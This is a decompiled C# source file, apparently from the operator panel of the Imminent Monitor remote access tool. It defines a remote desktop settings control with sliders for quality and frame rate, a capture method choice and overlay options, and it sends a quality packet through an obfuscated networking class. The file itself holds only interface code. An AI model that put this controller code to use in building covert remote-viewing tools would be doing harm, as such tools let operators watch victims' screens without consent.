// Decompiled with JetBrains decompiler
// Type: UserControlRemoteDesktopSettings
// Assembly: ImminentMonitor, Version=5.0.0.89, Culture=neutral, PublicKeyToken=null
// MVID: B073CE4A-B7A6-4CA1-871B-499EF3E27493
// Assembly location: C:\Users\Artem\Documents\Code\Imminent Monitor 5\Imminent Monitor.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

[DesignerGenerated]
public sealed class UserControlRemoteDesktopSettings : UserControl
{
  private IContainer icontainer_0;
  private CheckBox checkBox_0;
  private TrackBar trackBar_0;
  private Label label_0;
  private TrackBar trackBar_1;
  private Label label_1;
  private RadioButton radioButton_0;
  private RadioButton radioButton_1;
  private Label label_2;
  private Label label_3;
  private ComboBox comboBox_0;
  private GControl1 gcontrol1_0;
  private CheckBox checkBox_1;
  private CheckBox checkBox_2;
  private GClass18 gclass18_0;

  public UserControlRemoteDesktopSettings(GClass18 gclass18_1)
  {
    this.InitializeComponent();
    Class97.smethod_12((UserControl) this);
    this.gclass18_0 = gclass18_1;
  }

  [DebuggerNonUserCode]
  protected override void Dispose(bool disposing)
  {
    try
    {
      if (!disposing || this.icontainer_0 == null)
        return;
      this.icontainer_0.Dispose();
    }
    finally
    {
      base.Dispose(disposing);
    }
  }

  [DebuggerStepThrough]
  private void InitializeComponent()
  {
    this.vmethod_1(new CheckBox());
    this.vmethod_3(new TrackBar());
    this.vmethod_5(new Label());
    this.vmethod_7(new TrackBar());
    this.vmethod_9(new Label());
    this.vmethod_11(new RadioButton());
    this.vmethod_13(new RadioButton());
    this.vmethod_15(new Label());
    this.vmethod_17(new Label());
    this.vmethod_19(new ComboBox());
    this.vmethod_23(new CheckBox());
    this.vmethod_25(new CheckBox());
    this.vmethod_21(new GControl1());
    this.vmethod_2().BeginInit();
    this.vmethod_6().BeginInit();
    this.SuspendLayout();
    this.vmethod_0().AutoSize = true;
    CheckBox checkBox1 = this.vmethod_0();
    Point point1 = new Point(5, 53);
    Point point2 = point1;
    checkBox1.Location = point2;
    this.vmethod_0().Name = "CheckBox4";
    CheckBox checkBox2 = this.vmethod_0();
    Size size1 = new Size(130, 17);
    Size size2 = size1;
    checkBox2.Size = size2;
    this.vmethod_0().TabIndex = 34;
    this.vmethod_0().Text = "View Remote Cursor";
    this.vmethod_0().UseVisualStyleBackColor = true;
    TrackBar trackBar1 = this.vmethod_2();
    point1 = new Point(16, 251);
    Point point3 = point1;
    trackBar1.Location = point3;
    this.vmethod_2().Maximum = 100;
    this.vmethod_2().Minimum = 1;
    this.vmethod_2().Name = "Quality";
    TrackBar trackBar2 = this.vmethod_2();
    size1 = new Size(272, 45);
    Size size3 = size1;
    trackBar2.Size = size3;
    this.vmethod_2().TabIndex = 33;
    this.vmethod_2().TickStyle = TickStyle.None;
    this.vmethod_2().Value = 45;
    this.vmethod_4().AutoSize = true;
    Label label1 = this.vmethod_4();
    point1 = new Point(3, 234);
    Point point4 = point1;
    label1.Location = point4;
    this.vmethod_4().Name = "LabelQuality";
    Label label2 = this.vmethod_4();
    size1 = new Size(73, 13);
    Size size4 = size1;
    label2.Size = size4;
    this.vmethod_4().TabIndex = 32;
    this.vmethod_4().Text = "Quality (45%)";
    TrackBar trackBar3 = this.vmethod_6();
    point1 = new Point(16, 212);
    Point point5 = point1;
    trackBar3.Location = point5;
    this.vmethod_6().Maximum = 60;
    this.vmethod_6().Minimum = 1;
    this.vmethod_6().Name = "FPSLimit";
    TrackBar trackBar4 = this.vmethod_6();
    size1 = new Size(272, 45);
    Size size5 = size1;
    trackBar4.Size = size5;
    this.vmethod_6().TabIndex = 31;
    this.vmethod_6().TickStyle = TickStyle.None;
    this.vmethod_6().Value = 24;
    this.vmethod_8().AutoSize = true;
    Label label3 = this.vmethod_8();
    point1 = new Point(3, 195);
    Point point6 = point1;
    label3.Location = point6;
    this.vmethod_8().Name = "LabelFPSLimit";
    Label label4 = this.vmethod_8();
    size1 = new Size(268, 13);
    Size size6 = size1;
    label4.Size = size6;
    this.vmethod_8().TabIndex = 30;
    this.vmethod_8().Text = "FPS Limit (24) (Requires Restart of Remote Desktop)";
    this.vmethod_10().AutoSize = true;
    RadioButton radioButton1 = this.vmethod_10();
    point1 = new Point(16, 173);
    Point point7 = point1;
    radioButton1.Location = point7;
    this.vmethod_10().Name = "RadioButton2";
    RadioButton radioButton2 = this.vmethod_10();
    size1 = new Size(197, 17);
    Size size7 = size1;
    radioButton2.Size = size7;
    this.vmethod_10().TabIndex = 28;
    this.vmethod_10().Text = "DXGI 1.2 (Fastest) (Windows 8.1+)";
    this.vmethod_10().UseVisualStyleBackColor = true;
    this.vmethod_12().AutoSize = true;
    this.vmethod_12().Checked = true;
    RadioButton radioButton3 = this.vmethod_12();
    point1 = new Point(16, 152);
    Point point8 = point1;
    radioButton3.Location = point8;
    this.vmethod_12().Name = "RadioButton1";
    RadioButton radioButton4 = this.vmethod_12();
    size1 = new Size(223, 17);
    Size size8 = size1;
    radioButton4.Size = size8;
    this.vmethod_12().TabIndex = 27;
    this.vmethod_12().TabStop = true;
    this.vmethod_12().Text = "GDI32 (BitBlt) (Slowest) (Windows XP+)";
    this.vmethod_12().UseVisualStyleBackColor = true;
    this.vmethod_14().AutoSize = true;
    Label label5 = this.vmethod_14();
    point1 = new Point(1, 134);
    Point point9 = point1;
    label5.Location = point9;
    this.vmethod_14().Name = "Label2";
    Label label6 = this.vmethod_14();
    size1 = new Size(287, 13);
    Size size9 = size1;
    label6.Size = size9;
    this.vmethod_14().TabIndex = 26;
    this.vmethod_14().Text = "Capture Method (Requires Restart of Remote Desktop)";
    this.vmethod_16().AutoSize = true;
    Label label7 = this.vmethod_16();
    point1 = new Point(2, 89);
    Point point10 = point1;
    label7.Location = point10;
    this.vmethod_16().Name = "Label1";
    Label label8 = this.vmethod_16();
    size1 = new Size(274, 13);
    Size size10 = size1;
    label8.Size = size10;
    this.vmethod_16().TabIndex = 25;
    this.vmethod_16().Text = "Screen Source (Requires Restart of Remote Desktop)";
    this.vmethod_18().DropDownStyle = ComboBoxStyle.DropDownList;
    this.vmethod_18().FormattingEnabled = true;
    this.vmethod_18().Items.AddRange(new object[1]
    {
      (object) "Default"
    });
    ComboBox comboBox1 = this.vmethod_18();
    point1 = new Point(16, 109);
    Point point11 = point1;
    comboBox1.Location = point11;
    this.vmethod_18().Name = "ComboBoxScreen";
    ComboBox comboBox2 = this.vmethod_18();
    size1 = new Size(269, 21);
    Size size11 = size1;
    comboBox2.Size = size11;
    this.vmethod_18().TabIndex = 24;
    this.vmethod_22().AutoSize = true;
    CheckBox checkBox3 = this.vmethod_22();
    point1 = new Point(5, 30);
    Point point12 = point1;
    checkBox3.Location = point12;
    this.vmethod_22().Name = "ViewNetworkStatistics";
    CheckBox checkBox4 = this.vmethod_22();
    size1 = new Size(187, 17);
    Size size12 = size1;
    checkBox4.Size = size12;
    this.vmethod_22().TabIndex = 22;
    this.vmethod_22().Text = "View Network Statistics Overlay";
    this.vmethod_22().UseVisualStyleBackColor = true;
    this.vmethod_24().AutoSize = true;
    CheckBox checkBox5 = this.vmethod_24();
    point1 = new Point(5, 7);
    Point point13 = point1;
    checkBox5.Location = point13;
    this.vmethod_24().Name = "ViewChanges";
    CheckBox checkBox6 = this.vmethod_24();
    size1 = new Size(193, 17);
    Size size13 = size1;
    checkBox6.Size = size13;
    this.vmethod_24().TabIndex = 21;
    this.vmethod_24().Text = "View Motion Detection Changes";
    this.vmethod_24().UseVisualStyleBackColor = true;
    this.vmethod_20().method_1((GControl1.GEnum0) 1);
    GControl1 gcontrol1_1 = this.vmethod_20();
    point1 = new Point(0, 76);
    Point point14 = point1;
    gcontrol1_1.Location = point14;
    this.vmethod_20().Name = "Seperator1";
    GControl1 gcontrol1_2 = this.vmethod_20();
    size1 = new Size(279, 10);
    Size size14 = size1;
    gcontrol1_2.Size = size14;
    this.vmethod_20().TabIndex = 23;
    this.AutoScaleDimensions = new SizeF(6f, 13f);
    this.AutoScaleMode = AutoScaleMode.Font;
    this.BackColor = SystemColors.Control;
    this.Controls.Add((Control) this.vmethod_0());
    this.Controls.Add((Control) this.vmethod_2());
    this.Controls.Add((Control) this.vmethod_4());
    this.Controls.Add((Control) this.vmethod_6());
    this.Controls.Add((Control) this.vmethod_8());
    this.Controls.Add((Control) this.vmethod_10());
    this.Controls.Add((Control) this.vmethod_12());
    this.Controls.Add((Control) this.vmethod_14());
    this.Controls.Add((Control) this.vmethod_16());
    this.Controls.Add((Control) this.vmethod_18());
    this.Controls.Add((Control) this.vmethod_20());
    this.Controls.Add((Control) this.vmethod_22());
    this.Controls.Add((Control) this.vmethod_24());
    this.Font = new Font("Segoe UI", 8.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
    this.Name = nameof (UserControlRemoteDesktopSettings);
    size1 = new Size(287, 285);
    this.Size = size1;
    this.vmethod_2().EndInit();
    this.vmethod_6().EndInit();
    this.ResumeLayout(false);
    this.PerformLayout();
  }

  internal virtual CheckBox vmethod_0() => this.checkBox_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_1(CheckBox checkBox_3) => this.checkBox_0 = checkBox_3;

  internal virtual TrackBar vmethod_2() => this.trackBar_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_3(TrackBar trackBar_2)
  {
    EventHandler eventHandler = new EventHandler(this.method_1);
    if (this.trackBar_0 != null)
      this.trackBar_0.Scroll -= eventHandler;
    this.trackBar_0 = trackBar_2;
    if (this.trackBar_0 == null)
      return;
    this.trackBar_0.Scroll += eventHandler;
  }

  internal virtual Label vmethod_4() => this.label_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_5(Label label_4) => this.label_0 = label_4;

  internal virtual TrackBar vmethod_6() => this.trackBar_1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_7(TrackBar trackBar_2)
  {
    EventHandler eventHandler = new EventHandler(this.method_0);
    if (this.trackBar_1 != null)
      this.trackBar_1.Scroll -= eventHandler;
    this.trackBar_1 = trackBar_2;
    if (this.trackBar_1 == null)
      return;
    this.trackBar_1.Scroll += eventHandler;
  }

  internal virtual Label vmethod_8() => this.label_1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_9(Label label_4) => this.label_1 = label_4;

  internal virtual RadioButton vmethod_10() => this.radioButton_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_11(RadioButton radioButton_2) => this.radioButton_0 = radioButton_2;

  internal virtual RadioButton vmethod_12() => this.radioButton_1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_13(RadioButton radioButton_2) => this.radioButton_1 = radioButton_2;

  internal virtual Label vmethod_14() => this.label_2;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_15(Label label_4) => this.label_2 = label_4;

  internal virtual Label vmethod_16() => this.label_3;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_17(Label label_4) => this.label_3 = label_4;

  internal virtual ComboBox vmethod_18() => this.comboBox_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_19(ComboBox comboBox_1) => this.comboBox_0 = comboBox_1;

  internal virtual GControl1 vmethod_20() => this.gcontrol1_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_21(GControl1 gcontrol1_1) => this.gcontrol1_0 = gcontrol1_1;

  internal virtual CheckBox vmethod_22() => this.checkBox_1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_23(CheckBox checkBox_3) => this.checkBox_1 = checkBox_3;

  internal virtual CheckBox vmethod_24() => this.checkBox_2;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_25(CheckBox checkBox_3) => this.checkBox_2 = checkBox_3;

  private void method_0(object sender, EventArgs e) => this.vmethod_8().Text = string.Format("FPS Limit ({0})", (object) this.vmethod_6().Value);

  private void method_1(object sender, EventArgs e)
  {
    this.vmethod_4().Text = string.Format("Quality ({0}%)", (object) this.vmethod_2().Value);
    this.method_2();
  }

  private void method_2() => dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_2(this.gclass18_0, new object[3]
  {
    (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.Desktop,
    (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.RemoteDesktopPacket.Quality,
    (object) this.vmethod_2().Value
  });
}
